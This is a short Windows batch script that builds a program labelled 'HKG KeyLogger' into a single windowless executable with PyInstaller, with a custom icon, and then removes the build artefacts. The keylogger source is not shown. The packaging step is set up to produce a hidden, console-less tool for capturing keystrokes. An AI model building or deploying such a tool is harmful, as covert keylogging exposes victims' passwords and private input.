@echo off
REM Build HKG KeyLogger

cd /d %~dp0

set SCRIPT=src\main.py
set ICON=src\assets\icon.ico

python -m PyInstaller --onefile --noconsole --icon="%ICON%" --add-data "src\assets\icon.ico;assets" "%SCRIPT%"

rmdir /s /q build
del main.spec

echo main.exe successfully generated!
pause
